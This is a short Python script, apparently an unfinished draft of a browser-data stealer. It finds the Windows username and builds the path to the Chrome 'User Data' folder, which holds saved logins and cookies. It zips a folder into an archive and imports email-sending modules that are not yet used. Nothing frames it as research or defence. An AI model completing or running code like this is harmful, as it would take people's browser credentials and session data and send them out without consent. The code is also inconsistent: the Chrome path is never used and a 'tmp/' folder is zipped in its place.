import os
import zipfile
import smtplib
from email.mime.text import MIMEText

# Find the user of computer and store it
user = os.getlogin()

chrome_data_dir = f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data"


def zipdir(path, ziph):
    # ziph is zipfile handle
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file), 
                       os.path.relpath(os.path.join(root, file), 
                                       os.path.join(path, '..')))

with zipfile.ZipFile('Python.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
    zipdir('tmp/', zipf)

